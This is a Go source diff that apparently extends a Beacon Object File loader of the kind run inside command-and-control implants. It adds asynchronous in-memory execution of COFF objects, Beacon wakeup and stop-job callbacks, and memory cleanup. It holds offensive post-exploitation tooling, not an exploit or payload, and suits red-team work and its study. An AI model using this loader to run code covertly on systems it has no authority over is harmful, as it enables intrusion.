@@ -33,9 +33,15 @@ var (
 	kernel32           = syscall.MustLoadDLL("kernel32.dll")
 	procVirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
 	procVirtualProtect = kernel32.MustFindProc("VirtualProtect")
+	procVirtualFree    = kernel32.MustFindProc("VirtualFree")
 )
 
-func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) uintptr {
+type AsyncContext struct {
+	WakeupFunc func()
+	StopEvent  windows.Handle
+}
+
+func resolveExternalAddress(symbolName string, outChannel chan<- interface{}, asyncCtx *AsyncContext) uintptr {
 	if strings.HasPrefix(symbolName, "__imp_") {
 		symbolName = symbolName[6:]
 		// 32 bit import names are __imp__
@@ -112,6 +118,16 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return windows.NewCallback(boffer.AxAddScreenshot(outChannel))
 			case string("AxDownloadMemory"):
 				return windows.NewCallback(boffer.AxDownloadMemory(outChannel))
+			case string("BeaconWakeup"):
+				if asyncCtx != nil {
+					return windows.NewCallback(boffer.GetBeaconWakeup(asyncCtx.WakeupFunc))
+				}
+				return windows.NewCallback(func() uintptr { return 0 })
+			case string("BeaconGetStopJobEvent"):
+				if asyncCtx != nil {
+					return windows.NewCallback(boffer.GetBeaconGetStopJobEvent(asyncCtx.StopEvent))
+				}
+				return windows.NewCallback(func() uintptr { return 0 })
 			default:
 				fmt.Printf("Unknown symbol: %s\n", procName)
 				return 0
@@ -272,7 +288,7 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 
 			if isSpecialSymbol(symbol) {
 				if isImportSymbol(symbol) {
-					externalAddress := resolveExternalAddress(symbol.NameString(), output)
+					externalAddress := resolveExternalAddress(symbol.NameString(), output, nil)
 
 					if externalAddress == 0 {
 						return []utils.BofMsg{}, fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
@@ -329,6 +345,9 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.B
 			bofMsg = utils.BofMsg{}
 		}
 	}
+
+	boffer.ClearExtractedBuffers()
+
 	return msgs, nil
 }
 
@@ -356,4 +375,189 @@ func invokeMethod(methodName string, argBytes []byte, parsedCoff *File, sectionM
 			syscall.SyscallN(entryPoint, uintptr(unsafe.Pointer(&argBytes[0])), uintptr((len(argBytes))))
 		}
 	}
+}
+
+func virtualFree(addr uintptr) {
+	if addr != 0 {
+		procVirtualFree.Call(addr, 0, uintptr(0x8000)) // MEM_RELEASE
+	}
+}
+
+func freeSections(sections map[string]CoffSection, gotBase uintptr) {
+	for _, cs := range sections {
+		virtualFree(cs.Address)
+	}
+	virtualFree(gotBase)
+}
+
+type AsyncBof struct {
+	Output    chan interface{}
+	Done      chan struct{}
+	StopEvent windows.Handle
+	sections  map[string]CoffSection
+	gotBase   uintptr
+}
+
+func (a *AsyncBof) Stop() {
+	if a.StopEvent != 0 {
+		windows.SetEvent(a.StopEvent)
+	}
+}
+
+func (a *AsyncBof) Cleanup() {
+	if a.StopEvent != 0 {
+		windows.CloseHandle(a.StopEvent)
+		a.StopEvent = 0
+	}
+	freeSections(a.sections, a.gotBase)
+	boffer.ClearExtractedBuffers()
+}
+
+func LoadAsync(coffBytes []byte, argBytes []byte, wakeupFunc func()) (*AsyncBof, error) {
+	return LoadAsyncWithMethod(coffBytes, argBytes, "go", wakeupFunc)
+}
+
+func LoadAsyncWithMethod(coffBytes []byte, argBytes []byte, method string, wakeupFunc func()) (*AsyncBof, error) {
+	output := make(chan interface{}, 64)
+
+	stopEvent, err := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, initially non-signaled
+	if err != nil {
+		return nil, fmt.Errorf("CreateEvent failed: %s", err.Error())
+	}
+
+	asyncCtx := &AsyncContext{
+		WakeupFunc: wakeupFunc,
+		StopEvent:  stopEvent,
+	}
+
+	parsedCoff := Explore(binutil.WrapByteSlice(coffBytes))
+	parsedCoff.ReadAll()
+	parsedCoff.Seal()
+
+	sections := make(map[string]CoffSection, parsedCoff.Sections.Len())
+
+	gotBaseAddress := uintptr(0)
+	gotOffset := 0
+	gotSize := uint32(0)
+	var gotMap = make(map[string]uintptr)
+
+	bssBaseAddress := uintptr(0)
+	bssOffset := 0
+	bssSize := uint32(0)
+
+	for _, symbol := range parsedCoff.Symbols {
+		if isSpecialSymbol(symbol) {
+			if isImportSymbol(symbol) {
+				gotSize += 8
+			} else {
+				bssSize += symbol.Value + 8
+			}
+		}
+	}
+
+	for _, section := range parsedCoff.Sections.Array() {
+		allocationSize := uintptr(section.SizeOfRawData)
+		if strings.HasPrefix(section.NameString(), ".bss") {
+			allocationSize = uintptr(bssSize)
+		}
+
+		if allocationSize == 0 {
+			continue
+		}
+
+		addr, err := virtualAlloc(0, allocationSize, MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_READWRITE)
+		if err != nil {
+			freeSections(sections, gotBaseAddress)
+			windows.CloseHandle(stopEvent)
+			return nil, fmt.Errorf("VirtualAlloc failed: %s", err.Error())
+		}
+
+		if strings.HasPrefix(section.NameString(), ".bss") {
+			bssBaseAddress = addr
+		}
+
+		copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], section.RawData())
+
+		allocatedSection := CoffSection{
+			Section: section,
+			Address: addr,
+		}
+
+		sections[section.NameString()] = allocatedSection
+	}
+
+	gotBaseAddress, err = virtualAlloc(0, uintptr(gotSize), MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_READWRITE)
+	if err != nil {
+		freeSections(sections, 0)
+		windows.CloseHandle(stopEvent)
+		return nil, fmt.Errorf("VirtualAlloc failed: %s", err.Error())
+	}
+
+	for _, section := range parsedCoff.Sections.Array() {
+		sectionVirtualAddr := sections[section.NameString()].Address
+
+		for _, reloc := range section.Relocations() {
+			symbol := parsedCoff.Symbols[reloc.SymbolTableIndex]
+
+			if symbol.StorageClass > 3 {
+				continue
+			}
+
+			symbolDefAddress := uintptr(0)
+
+			if isSpecialSymbol(symbol) {
+				if isImportSymbol(symbol) {
+					externalAddress := resolveExternalAddress(symbol.NameString(), output, asyncCtx)
+
+					if externalAddress == 0 {
+						freeSections(sections, gotBaseAddress)
+						windows.CloseHandle(stopEvent)
+						return nil, fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
+					}
+
+					if existingGotAddress, exists := gotMap[symbol.NameString()]; exists {
+						symbolDefAddress = existingGotAddress
+					} else {
+						symbolDefAddress = gotBaseAddress + uintptr(gotOffset*8)
+						gotOffset += 1
+						gotMap[symbol.NameString()] = symbolDefAddress
+					}
+					copy((*[8]byte)(unsafe.Pointer(symbolDefAddress))[:], (*[8]byte)(unsafe.Pointer(&externalAddress))[:])
+				} else {
+					symbolDefAddress = bssBaseAddress + uintptr(bssOffset)
+					bssOffset += int(symbol.Value) + 8
+				}
+			} else {
+				targetSection := parsedCoff.Sections.Array()[symbol.SectionNumber-1]
+				symbolDefAddress = sections[targetSection.NameString()].Address + uintptr(symbol.Value)
+			}
+
+			processRelocation(symbolDefAddress, sectionVirtualAddr, reloc, symbol)
+		}
+
+		if section.Characteristics&defwin.IMAGE_SCN_MEM_EXECUTE != 0 {
+			oldProtect := PAGE_READWRITE
+			_, _, errVirtualProtect := procVirtualProtect.Call(sectionVirtualAddr, uintptr(section.SizeOfRawData), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+			if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+				freeSections(sections, gotBaseAddress)
+				windows.CloseHandle(stopEvent)
+				return nil, fmt.Errorf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
+			}
+		}
+	}
+
+	asyncBof := &AsyncBof{
+		Output:    output,
+		Done:      make(chan struct{}),
+		StopEvent: stopEvent,
+		sections:  sections,
+		gotBase:   gotBaseAddress,
+	}
+
+	go func() {
+		defer close(asyncBof.Done)
+		invokeMethod(method, argBytes, parsedCoff, sections, output)
+	}()
+
+	return asyncBof, nil
 }
